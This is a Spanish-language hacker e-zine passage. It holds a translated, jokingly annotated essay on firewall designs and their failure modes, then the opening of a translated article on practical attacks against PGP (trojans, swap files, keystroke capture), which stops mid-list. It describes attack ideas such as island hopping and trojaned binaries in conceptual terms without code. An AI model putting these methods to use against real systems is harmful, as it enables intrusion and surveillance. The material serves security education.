	- Lo que no esta expresamente permitido es prohibido.
	- Lo que no esta expresamente prohibido es permitido.

	A la importancia de esta distincion no se le puede dar mucho enfasis. En el caso 
anterior, el firewall debe ser diseñadopara bloquear todo, y los servicios deben ser 
habilitados en cada caso fundamentado este solo despues de una cuidadosa evaluacion de 
necesidades y riesgos. Esto tiende a afectar directamente a los usuarios, y ellos pueden 
ver el firewall como un obstaculo. En el segundo caso, el administrador del sistema se 
coloca en un modo reactivo, teniendo que predecir que tipo de acciones pueden hacer los 
usuarios que puedan debilitar la seguridad del fierwall, y preparar las defensas contra 
esas acciones. Esto generalmente pone al administrador del firewall en contra de los 
usuarios en una lucha sin fin que puede volverse muy peligrosa. Un usuario generalmente 
puede comprometer la seguridad de su Login si no estan advertidos ni se han puesto a 
pensar en las razones del porque es necesaria la seguridad. Si el usuario tiene abierto 
un acceso en el sistema del firewall mismo, esto puede resultar en una seria brecha de 
seguridad. La presencia de Logins de usuarios en el sistema del firewall tiende a
agrandar el problema de mantenimiento de la integridad del sistema. La segunda politica 
esta implicita en la frase "Aquello que no esta expresamente permitido es prohibido". Esta 
es mas segura ante fallas, desde que el administrador acepte que ignora que puertos TCP 
son seguros, o cuales agujeros pueden existir en el Kernel de las aplicaciones del 
fabricante (esto si que es dificil, todos los administradores creen que lo saben todo, 
juaaaaaaa). Dado que muchos de los vendedores son lentos para publicar los agujeros de 
seguridad de sus productos (y ahora Wipo Bill...empeora las cosas), esto claramente se 
vuelve un planteamiento mas conservador. Es admitible el hecho de que no sabes que puede 
dañarte.

NIVELES DE AMENAZA
	Si ignoras todo acerca de tu enemigo y de ti, ciertamente en cada batalla estaras 
en peligro - Sun Tzu

	Hay muchas maneras en las que un firewall puede fallar o quedar comprometido. 
Mientras ninguna de ellas sea buena, definitivamente algunas son peores que otras. Ya que 
el proposito de muchos firewalls es bloquear el acceso, es una verdadera falla si alguien 
encuentra un agujero que le permita entrar en una red privada. Y una situacion mas 
peligrosa si alguien consigue romper el firewall y reconfigurarlo para dar acceso a la red 
privada a cualquier persona. Por consideracion a la terminologia este tipo de ataque sera 
llamado "destruccion" de un firewall, que es opuesto al simple rompimiento del mismo. Es 
estremadamente dificil cuantificar el daño que puede resultar por la destruccion de un 
firewall. Una importante medida de como un buen firewall resistira la amenaza es recoger 
la informacion que ayude a determinir el curso de un ataque. Lo peor que puede pasarle a
una firewall es que este completamente comprometida sin ningun traceo de donde pudo haber 
venido el ataque. Y lo mejor que puede pasar es detectar el ataque, e informar al 
administrador que esta sufriendo un ataque, pero que ese ataque va a ser fallido.

Una forma de ver el resultado si un firewall esta comprometido es mirar las cosas en 
terminos de que puede ser llamado "Zona de Riesgo". En el caso de una red que este 
conectada directamente al Internet sin ningun firewall, la red entera esta propensa a 
ataques. Esto no implica que la red es vulnerable a ataques, pero en algunos casos donde 
redes enteras pueden alcanzar una red inalcanzable (Lease como lograr acceso a una red 
por medio de otra que si tiene acceso a esa red. sorry, pero no sabia como ponerlo), es 
necesario asegurarse de la seguridad (valga la redundancia) de cada host en esa red. 
Experiencias practicas muestran que esto es dificil, hay herramientas como el rlogin que 
da control de acceso que son aprovechados por los VANDALOS (vandalos..??? fuck you again) 
para obtener acceso a multiples hosts, en forma de atakes de "Island Hopping" (es esto 
algo asi como si el confia en ti, pero no en mi, y yo me hago pasar por ti, pues el 
confiara y me dejara pasar...!!! XD ...). En el caso de cualquier firewall, la zona de 
riesgo se reduce al firewall mismo, o a un selecto grupo de hosts en la red, reduciendo 
significativamente el trabajo al administrador de la red en lo concerniente a los atakes 
directos. Si el firewall es roto (si se logra tener acceso a el), la zona de riesgo se 
expande nuevamente, e incluye TODA la red protegida. Un VANDALO (ya me harte de leer ese 
termino... >:-( ) logra acceso a un login en el firewall puede empezar un atake tipo 
island hopping contra la red privada, usando como base el login del firewall. En esta 
situacion hay todavia una esperanza, ya que el VANDALO puede dejar sus pistas en el 
firewall y puede ser detectado. Si el firewall es completamente destruido la red privada 
puede ser atakada desde cualquier sistema externo y la reconstruccion del curso de un 
atake llega a ser casi imposible. (esta parece ser la mejor opcion para los VANDALOS XDDDD)

	En general, los firewalls pueden ser ser vistos en terminos de la reduccion de la
zona de riesgo a un solo punto. En sentido, esto parece ser una mala idea, ya que 
significa poner todos los huevos en una canasta (esto no lo entendi...que comparaciones..
debe ser algo asi como y la unica canasta con todos los huevos se cae...??? eso seria un 
huevonada jejejejeje), pero en la experiencia practica implica que en cualquier momento, 
habra unos cuantos hosts que son vulnerables a ser accesados por un atakante inexperto. 
Muchas empresas tienen politicas de seguridad diseñadas para afrontar esas debilidades, 
pero es 
muy tonto pensar que esas politicas son suficientes. Un firewall mejora la seguridad de 
los hosts, haciendo entrar a los atakantes por un embudo, donde hay el chance de 
detectarlos o atraparlos. Los castillos medievales bien construidos tenian multiples 
murallas y puntos de defensa por esta misma razon.

(Bueno, despues de toda esta carreta concerniente a por que las empresas instalan 
firewalls, pasamos a la chicha.. por fin, ya me estaba mamando..!!!)

FIREWALLS Y SUS COMPONENTES

	Debe haber miles de posturas de combate, pero solo hay un proposito: GANAR
	- Heiho Kaden

	Hablando de firewalls muchas veces hay confusion en la terminologia, puesto que
todos se diferencian ligeramente en la implementacion y no en el proposito. Varias 
discusiones en USENET indican que el termino "firewall" es usado para describir cualquier
eskema de seguridad entre redes.  Para en proposito de simplificar la discusion, se 
describira alguna de la terminologia, para dar una idea gneral:

	SCREENING ROUTER: Un screening router es un componente basico de la mayoria de los 
firewalls, Un screening Router (Algo asi como Router de pantalla) puede ser un router 
comercial o un router basado en un host con algun tipo de paquete con capacidad de filtrar
informacion. Los screening routers tipicos tienen la habilidad de blokear el trafico entre 
redes o a un host especifico, a nivel de puertos IP. Algunos firewalls consisten solamente 
en un screening router entre una red privada y el Internet.

	BASTION HOST: Los bastiones eran las partes mas fuertes de los castillos medievales 
eran puntos desde donde se podian observar las areas criticas de defensa, usualmente tenian 
fuertes murallas, cuartos para tropas de apoyo, y ocasionalmente tinajas de aceite 
hirviendo para desalentar a los enemigos. Un host bastion es un sistema identificado por 
el administrador del firewall como un punto altamente critico en la seguridad de la red.
Generalmente los Bastion Host tendran atencion extra para su seguridad, puede tener 
auditorias frecuentes, y puede tener modificaciones en el software.

	DUAL HOMED GATEWAY:  Algunos firewalls son implementados sin un screening router 
poniendo un sistema entre la red privada y la Internet, y deshabilitando el recorrido 
del TCP/IP. El host en la red privada se puede comunicar con el gateway, asi como el host 
en el Internet, pero el trafico directo entre las redes es blokeado. Por definicion un 
Dual Homed Gateway es un bastion host.

(Ahora tratare de dibujar lo mejor posible el diagrama que esta en el documento...)

Figura 1: Un Dual Homed Gateway tipico

                                Bastion Host
                                   __/__
                                  |  \  |
                                  |  /  |
                                 ____\____
( internet ) -------------------|    /    |---------------------- ( Red Privada )
                                |    \    |
                                 ----/----
                                     \

                    No hay trafico directo entre las redes


(uff bueno, por lo menos se entiende..pero si prefieren me piden el gif y se los mando..)

	SCREENED HOST GATEWAY: 	Posiblemente la configuracon de firewall mas comun es un 
screened host gateway, es usada utilizando un screening router y un bastion host. 
Usualmente el bastion host se encuentra en la red privada, y el screening router esta 
configurado de tal manera que el bastion host es el unico sistema de la red privada que 
puede ser alcanzado desde Internet. Frecuentemente el screening router esta configurado 
para blokear el trafico al bastion host en algunos puertos especificos, permitiendo solo 
que un pequeño numero de servicios se comuniquen con el.

(ohhhhh no, otra figura..!!!)

Figure 2: Screening Host Gateway tipico.                    __________________________
                                                           |              ______      |
             Tafico blokeado                               |             |      |     |
                        \ /                                |            _|______|_    |
(internet) --------------X---------------------------------|-----------|          |   |
                        / \                                |           |__________|   |
    |                  _______                             |           Otros Hosts    |
    |                 |_______|                            |                          |
    |                                                      |                          |
    |               Screening Router                       |        Red Privada       |
    |                                                      |                          |
    |____________________________                        __|___                       | 
                                 \                      |      |______________________|
      Trafico permitido           \                    _|______|_                     
                                   -------------------|          |                    
                                                      |__________|                    
                                                                                      
                                                      Bastion Host                    
(mmmm, parece que quedo mejor que el anterior...)

	SCREENED SUBNET: En algunas configuraciones Firewall, se crea un asubred aislada, 
y se situa entre Internet y la red privada. Tipicamente, esta red es aislada usando 
screening routers, los cuales pueden implementar varios niveles de filtracion. Generalmente 
una screened subnet es configurada para que ambos, tanto el Internet como la red privada 
tengan acceso al host en la screened subnet, pero el trafico que pasa a traves de la subred 
es bloqueado. Algunas configuraciones de estas subredes tienen un host bastion en la 
 red protegida, en ambos casos se soportan sesiones de terminal interactivas o niveles 
gateways de aplicacion.
                                                             ______________
Figura 3: Subred Screened Tipica                            |              |
                                                            |           ___|__
                                                            |          |      |
                                      \ /                   |         _|______|_
(Internet)-----------------------------X--------------------|        |          |
     |            Trafico Blokeado    / \                   |        |__________|
     |                              ________                |         Otros Hosts
     |                             |________|               |              |
     |                          Screening Router            |  Private     |
     |                                                      |     Network  |
     |                                                      |______________|
     |  ________________                                            |
      \|                |                                           |
       \  Screened      |                                           |
       |\     Subnet    |                                           |
       | \  ______      |                                           |
       |  \|      |     |                                           |
       |___|______|_    |                                           |
          |         |-----------------------------------------------+
          |_________|               Trafico Permitido
          Bastion Host


	NIVEL DE APLICACION GATEWAY (O PROXY GATEWAY): La mayoria del software en el Internet 
trabajan en el modo almacenar-y-direccionar; los mailers y los servidores news en USENET recogen 
la informacion, la examinan, y la encaminan hacia su direccion. Los niveles de aplicacion 
gateway son servicios especificos para encaminar o reflejar, los cuales usualmente operan mejor 
en el modo de usuario que en niveles de protocolo. Generalmente esos servicios de encaminamiento 
cuando estan corriendo en un firewall, son importantes para tofda la seguridad. El famoso agujero 
del sendmail que fue aprovechado por Gusano de Internet es un ejemplo de la clase de problemas de 
seguridad que puede presentar un gateway a nivel de aplicacion. Otros gateway a nivel de 
aplicacion son interactivos como los gateways del FTP y del TELNET que corren en los firewalls de 
la Digital Equipment Corporation. En general, el termino "Gateway de Nivel de Aplicacion" sera 
usado para describir algunos tipos de servicios de encaminamiento que corren a traves de un 
firewall y es un potencial que concierne a la seguridad. En general, los gateways de niveles de 
aplicacion cruciales corren en algunos hosts de tipo Bastion.

	HYBRID GATEWAYS: Los gateways hibridos son los de tipo "algo mas" de la lista en esta 
categoria. Ejemplos de como los sistemas pueden ser hosts conectados al Internet, pero 
disponibles solo a traves de lineas seriales conectadas a una terminal ethernet de un servidor 
en la red privada. Asi como el gateway puede aprovechar varios protocolos o hacer un tunneling 
de un protocolo sobre otro. Los Routers pueden mantener y monitorear el estado de todas las 
conecciones TCP/IP, o examinar el trafico para tratar de detectar y prevenir un atake. El 
firewall de la compañia AT&T es un gateway hibrido combinado con un host Bastion.

	Tomando los componentes descritos anteriormente, podemos describir con precision la 
mayoria de las formas que pueden tomar los firewalls, y podemos describir algunos de los 
tipos de problemas de seguridad que se pueden presentar. Asumiendo que el proposito basico 
de un firewall es ayudar a la proteccion de la red, es importante examinar cada tipo de 
firewall con respecto a:

	CONTROL DE DAÑOS: Si el firewall esta comprometido, que tipo de amenazas pueden dar 
acceso a la red privada?. Si es destruida, que tipo de amenazas pueden dar acceso a la red 
privada.?

	ZONAS DE RIESGO: Que tan grande es la zona de riesgo durante la operacion normal.?
La medida de esta es el numero de hosts o routers que pueden ser probados desde fuera de la 
red.

	MODO DE FALLO: Que tan facil es detectar si el firewall ha sido roto?, Que tan 
facil es detectar si el firewall ha sido destruido?, enuna operacion post Mortem (uffff que 
termino...!!! XD), cuanta informacion se puede hallar para diagnosticar el atake.

	EASE OF USE: Que tantos inconvenientes presenta el firewall?

	STANCE: La filosofia de diseño del firewall es "Lo que no esta expresamente 
permitido esta prohibido?" o es "Lo que no esta expresamente prohibido esta permitido?"?

FIREWALLS USANDO SCREENING ROUTERS

	"En la estrategia a gran escala, cuando el enemigo se embarca en un atake, 
si muestras algo de fortaleza suprimiendo su tecnica, el cambiara de idea" - Miyamoto Musashi.

Muchas redes son protegidas con firewalls usando unicamente un screening router entre la red 
privada y el Internet. Este tipo de Firewall es diferente de un gateway screened host en que 
usualmente alli hay comunicacion permitida entre varios hosts en la red privada y varios 
hosts en el Internet. la zona de riesgo es igual al numero de hosts en la red privada, y el 
numero y tipo de servicios a los cuales el screening router les permite el trafico. Para 
cada servicio que se provee via conexion punto a punto la zona de riesgo se amplia 
considerablemente. y eventualmente es imposible de determinar. El control de daños es muy 
dificil, tanto que el administrador  de la red necesitara examinar regularmente cada host 
para encontrar pistas de un acceso. Si no hay revisiones regulares, la unica esperanza es 
encontrar un indicio de algo asi como un registro de account errado.

	En al caso de destruccion total del firewall, sera muy dificil encontrar pistas, e 
incluso descubrirlo. Si se utiliza un router comercial (los cuales no utilizan registros 
de las entradas), y el password de administracion del router esta comprometido, toda la red 
privada puede estar en peligro y expuesta a atakes muy facilmente. Casos se han visto, donde 
routers comerciales han sido configurados con reglas de screening erroneas, o quedar en 
un modo pass-through (acceso directo) a causa de un error de hardware o de un operador. 
Generalmente esta configuracion es del caso "Lo que no esta expresamente prohibido es 
permitido" de la cual un usuario ingenioso puede facilmente jugar con los protocolos para 
obtener un mayor nivel de acceso al deseado por el administrador.

	Los screening routers no son la solucion mas segura, pero son populares, ya que 
permiten acceso gratis a Internet desde cualquier punto de la red privada. Muchos 
consultores y proveedores de servicio de redes ofrecen screening routers en sus 
configuraciones de firewalls. Es incierto si los problemas que este presenta son conocidos 
por los clientes. (Yo deberia decir que no, pues cual vendedor, antes de vender dice 
cuales son los problemas que presenta el articulo que el quiere vender...de todas 
formas gracias..!!! XD )

DUAL HOMED GATEWAY
	El principio de Hannibal era mantener sus fuerzas unidas y agruparlos en una sola 
fortaleza - Emperador Napoleon I

	Un firewall usado frecuentemente y facil de utilizar es el dual homed gateway. Ya 
que no encamina el trafico TCP/IP, actua como una muralla entre el Internet y la red privada.
Su facilidad de uso esta determinado en como el admisnitrador del sistema configura los 
accesos a su antojo. Ya sea dando aplicaciones gateway asi como encaminamientos TELNET o 
dando a los usuarios logins en el host gateway. Se toma el precedente, y la politica del 
firewall esta definida como "Lo que no esta expresamente permitido es prohibido"; los 
usuarios solo pueden accesar los servicios de Internet para los cuales estan las 
aplicaciones gateway. Si los usuarios tienen cuantas, entonces, en la opinion del autor, la 
seguridad del firewall queda seriamente debilitada. Durante la operacion normal, la unica 
zona de riesgo es el host gateway mismo, ya que es el unico host que es alcanzable desde 
el Internet. Si hay cuentas de usurios en el host gateway, y uno de los usuarios tiene un 
password debil o tiene su cuenta comprometida de alguna otra manera (Ingenieria Social u 
otros metodos), la zona de riesgo se expande hasta comprometer la red entera. Desde un punto 
de control de daños, el administrador puede seguir el progreso de un intruso, basado en los 
modos de acceso de la cuenta comprometida, pero un vandalo experto puede hacer esto muy 
dificil. Si un Dual Homed Gateway esta configurado de manera que los usuarios no tengan 
acceso directo a el, el control de daños puede ser mucho mas facil, ya que el mero hecho 
que alguien se haya loggeado al host gateway se vuelve sin duda en un evento contra la 
seguridad. Los dual homed gateways tiene ventaje sobre los screening routers desde el punto 
de vista que el software del sistema es adaptable facilmente para mantener los logs del 
sistema, copias impresas de los mismos, y logs remotos. Esto puede hacer mas facil el 
rastreo post mortem para el gateway, pero puede, o puede que no, ayudar al administrador a 
identificar que otros hosts en la red privada pueden estar comprometidos en un atake tipo
Island-Hopping.

	Atakar a un dual homed gateway le deja al atakante unas cuantas opciones. si el 
atakante consigue acceso a una red local obteniendo una cuenta, puede poner en marcha todos 
los atakes disponibles para las redes locales. Sistemas de archivos NFS, debilidad en 
archivos .rhosts, sistemas de distribucion automatica de software, programas de backup de 
redes, y shell scripts administrativos. - Todos pueden ser un problema en los sistemas 
de redes internas. Una vez se toma provecho de estos problemas, desde alli se puede tener 
una base desde la cual lanzar atakes hacia el gatewat mismo. La mayor debilidad de un Dual 
Homed Gateway es su modo de falla. Si el firewall es destruido, es posible que un atakante 
experto pueda habilitar el ruteo a traves de toda la red privada y dejarla disponible para 
nuevos atakes. En el Dual Homed Gateway basado en Unix, el ruteo del TCP/ip es deshabilitado 
la variable ipforwarding del Kernel; si alguien obtiene los privilegios del administrador 
en el gateway, la variable puede ser cambiada. Si embargo, esto parece ser muy lejano, pero 
hay que tener monitorear el software, y las configuraciones en el host gateway, no es 
improbable que un VANDALO con una copia de los Releases Notes del sistema operativo y una 
cuenta pueda comprometer el sistema.

SCREENED HOSTS GATEWAYS
	Donde el acceso es dificil, la via es tortuosa, y un enemigo pequeño puede derribar 
al mas grande normalmente se le llama "Emboscada" - Sun Tzu

	Muchos articulos han descrito los screened hosts gateways, y como construirlos. 
Generalmente, un screened host gateway es muy seguro, y bastante facil de implementar.
Normalmente un host bastion es configurado en la red privada, con un screening router entre 
el Internet y la red privada, el cual solo permite acceso a Internet al Bastion Host.
Ya que el Bastion Hosts se encuentra en la red privada, la conectividad para los usuarios 
es muy buena, y los problemas que se presentan por los ruteos extraños no estan presentes 
en ellos. Si la red privada es, como muchas lo son, una extension virtual de una red local 
el screened host gateway trabajara sin necesidad de hacer cambios en la red local, asi como 
la red local estara usando un set legitimo de direcciones de red asignadas. La zona de 
riesgo de un screened host gateway queda restringida unicamente al Bastion Host y al 
screening router, y la sentencia de seguridad del screened host gateway se determina por 
el software que corre en el sistema. Si un atakante logra acceso al Bastion Host, encontrara 
una gran cantidad de de opciones para el atake al resto de la red. De todas formas, este 
planteamiento es similar al de el Dual Homed Gateway, compartiendo los mismos modos de fallo 
y diseño, considerados con respecto al software que corre en el Bastion Host.

SCREENED SUBNETS
	Cundo el enemigo adopta una posicion inconveniente, no lo dejes mirar a su alrededor. 
- Miyamoto Musashi

	Una screened Subnet es configurada usualmente con un Bastion Host como el unico 
punto de acceso a la subred. La zona de riesgo es pequeña, consistente en el Bastion Host
o hosts, y cualquier screening router que hagan la conexion entre la screened subnet, el 
Internet y la red privada. La facilidad de uso, y la regla basica de la screened subnet 
puede variar, pero generalmente una screened subnet es utilizada por los firewalls que
aprovechan la ventaja del ruteo para reforzar la screening existente. Este planteamiento 
fuerza a que todos los servicios que pasan a traves del firewall sean proveidos por 
aplicaciones gateway, y pone la sentencia de "Lo que no esta expresamente permitido es 
prohibido".

Si un Firewall basado en una screened subnet con el ruteo entre redes blokeado es atakado 
con un intento de destruirlo, el atakante debe reconfigurar el ruteo en tres redes, sin 
desconectarse o blokearse a si mismo, y sin que los cambios de ruteo sean notificados. No 
hay duda que esto es posible, pero puede ser muy dificil si se deshabilita el acceso a 
los screening routers a traves de la red, o configurando los screening routers, de manera 
que solo permitan acceso desde un host especifico en la red privada. En este caso un 
atakante necesitara entrar en el Bastion Host, y de ahi a uno de los hosts de la red 
privada, para luego salir nuevamente hacia la screening router - y tendra que hacer todo 
esto sin levantar alarmas (Esta como jodida la vaina.)

Otra de las ventajas de la screened subnet es que pueden ser instaladas de forma que 
escondan cualquier accidente de historia que pueda recaer sobre la red privada. Muchos 
sitios quieren conectarse a Internet se desaniman al tener que re-asignar direcciones a las 
redes existentes. Con una screened subnet que blokee el ruteo entre redes, una red privada 
puede ser conectada a Internet y luego cambiar gradualmente la direcciones de red de sus 
subredes. De hecho, este planteamiento ha sido observado para acelerar significativamente 
la adopcion de nuevas direcciones de red en redes privadas pobremente controiladas. Los 
Usuarios estaran mas receptivos para el cambio de direccion de sus hosts si se dan cuenta 
de los beneficios del Internet, ya que los hosts que no tengan una direccion correcta no 
podran usar el firewall. En otros aspectos, la screened subnet es mucho mas dependiente 
del suite de software que este corriendo en el Bastion Host. Resguardar toda una subred 
provee funcionalidad similar al Dual Homed Gateway o al screened host gateway; difiere 
principalmente en el nivel extra de complejidad en el ruteamiento y configuracion de los 
screening routers.

GATEWAYS HIBRIDOS
	En la guerra de la guerrilla no hay como una batalla decisiva; no hay nada 
comparable al arreglo, a la defensa pasiva esta es una caracteristica de la guerra ortodoxa.
- Mao en la guerra de la guerrilla.

	"La seguridad a traves de la oscuridad" no es suficiente en si misma, pero no hay 
pregunta mas que una configuracion inusual, o una que sea dificil de entender, es como darle 
una pausa al atake, o hacerlos revelarse a si mismos en el proceso de tratar de ver contra 
que se estan enfrentando. De otro lado, es una ventaja real tener una configuracion que sea 
facil de entender, y por lo tanto facil de evaluar y mantener. Ya que el Gateway Hibrido 
esta calificado en la categoria de "Algo Mas" no intentaremos describir lo indescribible. 
Algunos hibridos hipoteticos pueden servir para mostrar como los gateways hibridos pueden 
ser diferentes entre si y ser similares a otros tipos.

Ahora hablaremos de un gateway hibrido que consiste en una caja colocada en el Internet, 
la cual tiene la capacidad de rutear el trafico, y que tambien mantiene una nocion 
completa del estado de cada coneccion TCP, cuantos datos han pasado a traves de ella, 
desde donde fueron originados y su destino. Presumiblemente, las conecciones pueden ser 
filtradas basadas en unas reglas especificas como: "Permitir el trafico entre el host A 
en la red privada y todos los hosts en la red B a traves del servicio TELNET si, y solo si 
la conexion originada desde el host A entre las 9:00 am y las 5:00 pm, y teniendo un log 
del trafico" Esto suena terrible (Ya lo creo), dando control arbitrario con gran facilidad 
de uso, pero algunos problemas simplemente se rehusan a desaparecer. Considerando que 
alguien que desee pasar el firewall, entre a la red privada a traves de un modem que no 
este protegido, le podria ser muy facil configurar un servicio escondido en el puerto del 
TELNET. Esta es una forma facil de destruir un firewall.

Otro gateway hibrido puede tomar ventaja de las varias formas del tunneling de protocolos.
Suponiendo que la necesidad es conectarse a internet con restricciones hermeticas, pero se 
necesita un alto grado de conectividad entre la red privada y una red externa en la cual 
se confia. El arquetipo usual del gateway muestra como puede dar conectividad multiproposito 
para e-mail, pero comunicaciones seguras punto a punto, una conexion virtual TCP/IP punto 
a punto encriptada que debe ser configurada en el sistema remoto, a los cuales, despues los 
usuarios se identifican con una tarjeta criptografica. Esto puede ser extremadamente seguro, 
y puede ser muy facil de usar, pero tiene la desventaja que el controlador del protocolo 
debe ser adicionado en cada sistema que quiera compartir comunicacion. Es dificil hacer 
alguna conjetura sobre los fallos de ese sistema, pero la zona de riesgo es limitada a todos 
los hosts que estan utulizando el driver del protocolo y a los usuarios individuales que 
tienen las tarjetas de acceso. Algo de esto puede ser implementado en el Hardware o en los 
mismos routers. En el futuro, dado el gran creciemiento del Internet habra mas desarrollos 
en esta area, y surgiran varios gateways hibridos. Las reglas basicas en cuanto a 
configuracion de firewalls posiblemente seguiran iguales a las aqui discutidas.


OTRAS HERRAMIENTAS RELACIONADAS CON LOS FIREWALLS
	Sutil e Insustancial; El experto no dej huella; divinamente misterioso, es inaudible 
- Sun Tzu

	Hay busquedas activas y desarrollos de herramientas para agresivamente buscar e 
identificar las debilidades de una red, o para detectar muestras que puedan indicar que un 
atake esta en progreso. Esas herramientas van desde una simple lista de chequeo hasta 
complejos "sistemas expertos" con deduccion de estrategias y elaboracion de reglas basicas.
Muchos firewalls de hoy corren software que esta diseñado para adelantarse y recoger 
informacion relativa a un posible atake y su origen, como el uso y abuso del finger y el 
SNMP. A meno que verdadera inteligencia artificial sea desarrollada, esas herramientas 
no pueden proteger contra una forma desconocida de atake, ya que no hay posibilidad de 
igualar la creatividad de un Vandalo de redes. Aunque estos sistemas sean calificados 
como Proactivos en realidad son reactivos, y generalmente solo serviran para detectar 
crackers armados con trucos ya viejos. Pero eso no es tan facil, ya que eloos estan 
siempre en busqueda y desarrollo de nuevas tecnicas para lograr entrar a un sistema.


NO SON CONCLUSIONES, PERO SI OBSERVACIONES (son del autor, no mias)
==========================================

	Aquellos experimentados en la guerra cultivan el Tao y preservan las leyes, es por 
esto que son capaces de formular politicas victoriosas. - Sun Tzu

	Es el privilegio de un escritor usar la ultima seccion de una publicacion para dar 
a conocer su opinion y llamarlas conclusiones. Hablando de firewalls, no es razonable decir 
cual es la mejor eleccion, ya que hay muchos factores que determinan cual es
el mejor firewall para determinada situacion, como el costo, las politicas de la
empresa, la tecnologia de redes existente, y las politicas internas de
organizacion, estas son las razones de mas peso a tener en cuenta.

Las observaciones que se  hacen sobre los firewalls son a un nivel muy general . Primeramente 
el firewall es un apalancamiento - creciente dispositivo desde un punto de vista de dirección 
de red. Más bien que mirandolos como "todos los huevos en una de canasta," puede también ser 
inspeccionada como una canasta confiable, y una cuestión simple desde que un sistema de 
seguridad muy importante , pueda controlarse. El tamaño de la zona de riesgo es crucial al 
diseño; si es pequeño, la seguridad puede mantenerse y controlada fácilmente , pero si 
la seguridad se arregla, el daño podria ser más severo. 
Un segundo aspecto importante es que la configuracion de un firewall  no es algo para 
emprender a tontas y a locas.Muchos sitios se conectan con un cortafuego simple que consiste 
de una selección de router y nada más porque alguien les contó que era lo suficientemente 
seguro ".Establecer un cortafuego es definitivamente un área donde el tener antecedentes y 
experianecias , nos serviran para mantener nuestro esquema de seguridad . Los vándalos sobre 
la red tambien juntan experiencias y conocimientos asi que no hay que dejar que se nos adelanten .

El propósito de este documento no es desalentar a las compañías a conectarse a Internet. El
Internet es un recurso increíblemente valioso, tanto asi que en los años venideros cambiará 
completamente el metodo de trabajo de la gente  y los comunicara a nivel global. Los beneficios 
de conexión lejos exceden los costos, pero es sabio reducir posibles perdidas por intromisiones 
a nuestra red por lo cual debermos crear conciencia y protegiendonos todo lo que sea necesario . 
El propósito de este papel no es para sembrar "el temor, la incertidumbre y la duda" en 
la orden de vender cualquier software o cortafuego particular . 


TAkER 
	

ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ
                       


				     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                             #                                 #
                             # 5.-Ataques prácticos contra PGP #
                             #                                 #
                             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



_______________________________________________________________________ By Joel McNamara


Archivo original : Practical Attacks on PGP  
Autor Original   : Joel McNamara
Traducido por    : Arturo Quirantes Sierra 
Este texto ha sido publicado previa autorizacion de su autor Joel McNamara y del 
Traductor del mismo , Arturo Quirantes . !!!

¿Están tus mensajes cifrados mediante PGP a salvo de ojos depredadores? Aunque la 
combinación de IDEA, RSA y MD5 hace a PGP resistente a los ataques criptográficos 
conocidos, hay otras maneras de violar la seguridad de un usuario. 

Esta presentación discute ataques prácticos que un oponente puede usar para 
comprometer PGP. Estos métodos son generalmente mucho más eficientes y económicos
que intentos de reventar claves con gran coste de CPU. Vulnerabilidades tales como
acceso al archivo de intercambio [swap file], versiones de PGP e interfaces con 
troyanos, vigilancia del teclado, fuerza bruta y robo de claves se explorarán aquí. 
Se sugieren contramedidas para mejorar la seguridad. 

Iba a dar la siguiente presentación en Hacking in Progress 97 a las afueras de 
Amsterdam, Holanda, en Agosto. Desafortunadamente, my descanso veraniego como 
bombero forestal se puso por medio, con una tardía temporada de incendios. 
Dave Del Toro, de PGP Inc. presentará una variación del siguiente trabajo 
que yo escribí (que es versión .90), y será completado, incluyendo enlaces,
cuando tenga tiempo. 


PGP se ha convertido en el estándar de facto para las comunicaciones cifradas 
por Internet. Los algoritmos criptográficos fuertes empleados, la naturaleza 
abierta del código fuente, revisión informal por expertos criptográficos civiles,
todo ha dado a PGP un aura de invencibilidad contra fisgones potenciales. 
Actualmente, la reputación de PGP parece justificada. Los métodos criptoanalíticos 
modernos no han descubierto ninguna debilidad evidente, y los ataques de fuerza 
bruta contra claves de 1.024 bits y más son irrealistas. Descartando avances no 
revelados en la factorización o la computación cuántica, podemos conjeturar que 
las agencias gubernamentales se han topado con las mismas barreras 
criptoanalíticas que se han encontrado los criptógrafos civiles. 

Aunque un algoritmo fuerte es crítico en la seguridad de una aplicación de cifrado, 
el público en general parece depositar demasiada fe en los números y las ecuaciones 
que proclaman que un mensaje cifrado no puede ser reventado. Las citas populares 
como "se necesitaría un tiempo igual a la edad del universo para reventar un mensaje
" o "podría ser reventado con tantos ordenadores como átomos existen en la Tierra" 
suenan como eslóganes de anuncio. 

Y, aunque computacionalmente hablando, tales afirmaciones puedan ser correctas, 
desprecian un hecho simple.Hay numerosos ataques prácticos que no se apoyan en 
criptoanálisis, y que pueden esponer los contenidos de un mensaje cifrado con 
PGP tan fácilmente como pelar un plátano. 

Esos ataques son baratos, eficientes, a veces difíciles de detectar, y pueden 
ser elegantemente simples.
Hay una buena probabilidad de que ya estén siendo usados durante actividades 
de vigilancia de las fuerzas de seguridad, operaciones de obtención de información 
del gobierno, o esfuerzos de espionaje industrial. 

Este trabajo describe ataques prácticos que pueden comprometer la seguridad de 
PGP, particularmente en entorno Windows. (Para ser justos, estas debilidades no 
son exclusivas de PGP. Acechan a la mayoría de las aplicaciones criptográficas 
y de seguridad. Para mayor crédito de Phil Zimmermann, él siempre ha estado 
advirtiendo de los riesgos de estas clases de ataque en la documentación de PGP. 
Desafortunadamente, la mayoría de la gente no se tomas los avisos en serio). 

Recuerda, al igual que el consumo de un coche, su escenario de riesgo puede variar. 


Ataques mediante caballos de Troya 
==================================

Las aplicaciones estilo caballo de Troya son una buena herramienta en el arsenal
de un ladrón de sistemas. El mundo UNIX ha estado plagado por troyanos, creados 
por Hackers que facilitan puertas traseras tipo "ábrete sésamo" con acceso a 
sistemas. Pero hasta ahora, el mundo PC solo ha sido atacado por un puñado de 
troyanos. Típicamente maliciosos en naturaleza, afirman mejorar tu vida, 
pero acaban borrando tu disco duro. 

La seguridad de PGP podría ser subvertida con un caballo de Troya. Se han escrito 
varias pruebas de troyanos conceptuales que debilitarían PGP, pero hasta ahora 
no ha habido incidentes de ataques "al aire libre." La amplia escala de Internet 
como mecanismo para conseguir software aumenta esta vulnerabilidad. 

".EXE y DLL" 

PGP puede ser atacado al introducir debilidades, bien mediante parches de código 
binario, o bien modificando y recompilando el código fuente. 

Las rutinas clave de PGP en peligro incluyen: 

